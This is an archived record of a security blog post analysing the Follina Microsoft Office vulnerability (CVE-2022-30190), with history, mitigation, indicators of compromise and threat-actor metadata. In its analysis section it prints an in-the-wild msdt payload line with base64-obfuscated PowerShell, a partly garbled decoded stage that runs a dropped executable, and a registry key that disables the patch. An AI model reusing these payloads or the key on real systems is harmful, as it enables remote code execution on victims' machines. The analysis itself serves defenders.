{
    "id": "09a84be0-7316-4216-9e88-681b30ce147f",
    "created_at": "2023-04-05T02:09:18.56475Z",
    "updated_at": "2025-03-27T02:17:05.613603Z",
    "deleted_at": null,
    "sha1_hash": "df3610285bdb64ff8a503a893936d49066959617",
    "title": "2022-06-23 - Follina, the Latest in a Long Chain of Microsoft Office Exploits",
    "authors": "",
    "file_creation_date": "2023-04-03T08:51:17Z",
    "file_modification_date": "2023-04-03T08:51:17Z",
    "file_size": 644612,
    "plain_text": "# Follina, the Latest in a Long Chain of Microsoft Office Exploits\n\n**inquest.net/blog/2022/06/23/follina-latest-long-chain-microsoft-office-exploits**\n\nPosted on 2022-06-23 by Pedram Amini\n\n## History of Headlines\n\nMicrosoft Office has been a long favorite delivery mechanism for malicious payloads, from pen-testers to nation-state threat actor groups, and\nfor good reason. Widely adopted. Large attack surface. Robust legacy support. These traits have been the source of news headlines for\ndecades.\n\n[Looking back briefly, we have the Dynamic Data Exchange (DDE) of 2017, which spanned CVE IDs CVE-2017-8759, CVE-2017-11292, and](https://inquest.net/blog/2017/10/13/microsoft-office-dde-macro-less-command-execution-vulnerability)\nCVE-2017-11826. A vulnerability so simple to exploit that a proof-of-concept could be made via point-and-click directly from within Office, see\nFigure 1.\n\n**_Figure 1: Point-and-Click PoC for DDE vulnerability._**\n[This was a rough year for the Microsoft ecosystem as 2017 also carried the infamous CVE-2017-0199 and CVE-2017-11882 (Equation Editor)](https://inquest.net/blog/2018/02/12/deep-file-inspection)\n[vulnerabilities, arguably the heaviest abused CVEs by malware in the years since. In 2019 we saw the rise of \"macrosheets\", a backward](https://inquest.net/blog/2020/05/06/ZLoader-4.0-Macrosheets-)\ncompatibility feature of Microsoft Office that provides support for macros from Excel 4.0, released in 1992. Take a look at Figure 2 to get a feel\nfor how arcane this functionality is.\n\n\n-----\n\n**_Figure 2: Microsoft Excel 4.0_**\n\nThe \"macrosheet\" vector was quickly and widely adopted by malware distributors and it continued to be a favorite until this year. In 2021 we\nsaw [CVE-2021-40444, a Microsoft MSHTML vulnerability discovered being exploited in the wild.](https://inquest.net/blog/2021/09/13/cve-2021-40444)\n\nThis brings us to 2022. On May 27, @nao_sec Tweeted about a suspicious document pivoting through Microsoft's Support Diagnostic Toolth\nvia the ['ms-msdt' scheme. The timing of this in-the-wild discovery coincided with a US holiday, and over the weekend the vulnerability picked](https://twitter.com/nao_sec/status/1530196847679401984)\nup the name \"Follina\". On May 31, we saw an official acknowledgment from Microsoft and formalized on CVE-2022-30190.st\n\nInteresting maldoc was submitted from Belarus. It uses Word's external link to load the HTML and then uses the \"ms-msdt\" scheme to\n[execute PowerShell code.https://t.co/hTdAfHOUx3](https://t.co/hTdAfHOUx3) [pic.twitter.com/rVSb02ZTwt](https://t.co/rVSb02ZTwt)\n\n[â€” nao_sec (@nao_sec) May 27, 2022](https://twitter.com/nao_sec/status/1530196847679401984?ref_src=twsrc%5Etfw)\n\n**_Figure 3: Tweet from @nao_sec._**\nHowever, this isn't the beginning of this story. If we look further back we can find in-the-wild document carriers exploiting CVE-2022-30190 in\nmid-April:\n\n_April 8th, 2022:_ [d61d70a4d4c417560652542e54486beb37edce014e34a94b8fd0020796ff1ef7 on InQuest Labs](https://labs.inquest.net/dfi/sha256/d61d70a4d4c417560652542e54486beb37edce014e34a94b8fd0020796ff1ef7)\n\n_April 12th, 2022 :_ [710370f6142d945e142890eb427a368bfc6c5fe13a963f952fb884c38ef06bf on InQuest Labs](https://labs.inquest.net/dfi/sha256/710370f6142d945e142890eb427a368bfc6c5fe13a963f952fb884c38ef06bfa)\n\nThe plot thickens even further when we consider that in August of 2020, Benjamin Altpeter published a bachelor thesis titled \"An Analysis of\nthe State of Electron Security in the Wild\" which outlined this very issue with MSDT.\n\nThe flaw is trivially exploitable and results in arbitrary code execution. As we've seen with similar vulnerabilities in the past, the simplicity and\nefficacy of this vulnerability lends itself to rapid adoption by malware authors. Fortunately, a patch is available as of June 14th and before the\npatch a simple mitigation could be applied to disable the 'ms-msdt' schema:\n\n**reg delete HKEY_CLASSES_ROOT\\ms-msdt /f**\n\nThis vulnerability has garnered more attention than any other CVE this year and rightfully so. It is highly recommended that defenders patch\n[this issue immediately. APT actors such as TA413 and Sandworm have been seen leveraging this flaw to target Tibetan and Ukrainian assets,](https://cert.gov.ua/article/160530)\nrespectively. Microsoft identifies malware exploiting this vulnerability as \"Mesdetty\".\n\n## A Deeper Look\n\n[While additional vectors have been discovered via FoxIt Reader and even RTF via the preview pane, the initial samples began with a Microsoft](https://twitter.com/j00sean/status/1534116178989395968)\nOffice document containing a remote object reference that pivots through the msdt.exe binary,, as seen here:\n\n\"C:\\WINDOWS\\system32\\msdt.exe\" ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c\nIT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(InvokeExpression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+\n\n[char]34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bc\n\n[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"\n\nNote that the next stage of the payload is encoded in base64 above and shown here decoded:\n\n\n-----\n\n$c d c \\\\ do s\\\\syste 3 \\\\c d e e ;Sta t ocess $c d do sty e dde gu e t st /c tas / / sdt e e ;Sta t ocess\n$cmd -windowstyle hidden -ArgumentList \"/c cd C:\\\\users\\\\public\\\\&&for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&&findstr\nTVNDRgAAAA 1.rar>1.t&&certutil -decode 1.t 1.c &&expand 1.c -F:* .&&rgb.exe\"\n\nNo buffers. No heap fills. No type-confusion. A simple path to executing arbitrary Powershell directives. Looking at the patch Microsoft\n[released on June 14th, @80vul highlights the Regular Expression based command-line argument filtration in a Tweet as depicted in Figure 4:](https://twitter.com/80vul/status/1536920233255968769)\n\nFigure 4: Regular Expression command-line filter patch.\nIf history is to teach us a lesson, this approach will likely be insufficient as researchers or attackers tinker with ways of bypassing the filter. On\na final interesting note, it is possible to disable this patch by setting the following key to a DWORD value of 1:\n\n**HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\ScriptedDiagnostics\\TurnOffCheck**\n\n## Further Resources\n\nFor further research see the PoCs, samples, and indicators listed below.\n\n### Public Proof-of-Concepts (PoC):\n\n Real-world Malware Samples:\n\n[https://labs.inquest.net/dfi/sha256/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784](https://labs.inquest.net/dfi/sha256/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784)\n[https://labs.inquest.net/dfi/sha256/6b06af3d20fd4f35fe62151d45e4344314d26b68d886d80ad6d8a375820247cf](https://labs.inquest.net/dfi/sha256/6b06af3d20fd4f35fe62151d45e4344314d26b68d886d80ad6d8a375820247cf)\n\n### Indicators of Compromise (IOCs):\n\n[cssformats[.]com](https://labs.inquest.net/lookup/domain/cssformats%5B.%5Dcom)\n[xmlformats[.]com](https://labs.inquest.net/lookup/domain/xmlformats%5B.%5Dcom)\n\n[exploit](https://inquest.net/taxonomy/term/7) [in-the-wild\nmalware-analysis](https://inquest.net/taxonomy/term/8)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-06-23 - Follina, the Latest in a Long Chain of Microsoft Office Exploits.pdf"
    ],
    "report_names": [
        "2022-06-23 - Follina, the Latest in a Long Chain of Microsoft Office Exploits.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "9792e41f-4165-474b-99fa-e74ec332bd87",
            "created_at": "2023-01-06T13:46:38.986789Z",
            "updated_at": "2025-03-27T02:00:02.970288Z",
            "deleted_at": null,
            "main_name": "Lucky Cat",
            "aliases": [
                "White Dev 9",
                "TA413"
            ],
            "source_name": "MISPGALAXY:Lucky Cat",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3b1367ff-99dc-41f0-986f-4a1dcb41bbbf",
            "created_at": "2022-10-25T16:07:24.273478Z",
            "updated_at": "2025-03-27T02:02:10.157226Z",
            "deleted_at": null,
            "main_name": "TA413",
            "aliases": [
                "White Dev 9"
            ],
            "source_name": "ETDA:TA413",
            "tools": [
                "Exile RAT",
                "ExileRAT",
                "Sepulcher"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "7bd810cb-d674-4763-86eb-2cc182d24ea0",
            "created_at": "2022-10-25T16:07:24.1537Z",
            "updated_at": "2025-03-27T02:02:10.126127Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "APT 44",
                "ATK 14",
                "BE2",
                "Blue Echidna",
                "CTG-7263",
                "FROZENBARENTS",
                "IRIDIUM",
                "Iron Viking",
                "Quedagh",
                "Sandworm",
                "Sandworm Team",
                "Seashell Blizzard",
                "TEMP.Noble",
                "UAC-0082",
                "UAC-0113",
                "UAC-0125",
                "UAC-0133",
                "Voodoo Bear"
            ],
            "source_name": "ETDA:Sandworm Team",
            "tools": [
                "AWFULSHRED",
                "ArguePatch",
                "BIASBOAT",
                "Black Energy",
                "BlackEnergy",
                "CaddyWiper",
                "Colibri Loader",
                "Cyclops Blink",
                "CyclopsBlink",
                "DCRat",
                "DarkCrystal RAT",
                "Fobushell",
                "GOSSIPFLOW",
                "Gcat",
                "IcyWell",
                "Industroyer2",
                "JaguarBlade",
                "JuicyPotato",
                "Kapeka",
                "KillDisk.NCX",
                "LOADGRIP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "ORCSHRED",
                "P.A.S.",
                "PassKillDisk",
                "Pitvotnacci",
                "PsList",
                "QUEUESEED",
                "RansomBoggs",
                "RottenPotato",
                "SOLOSHRED",
                "SwiftSlicer",
                "VPNFilter",
                "Warzone",
                "Warzone RAT",
                "Weevly"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1680660558,
    "ts_updated_at": 1743041825,
    "ts_creation_date": 1680511877,
    "ts_modification_date": 1680511877,
    "files": {
        "pdf": "https://archive.orkl.eu/df3610285bdb64ff8a503a893936d49066959617.pdf",
        "text": "https://archive.orkl.eu/df3610285bdb64ff8a503a893936d49066959617.txt",
        "img": "https://archive.orkl.eu/df3610285bdb64ff8a503a893936d49066959617.jpg"
    }
}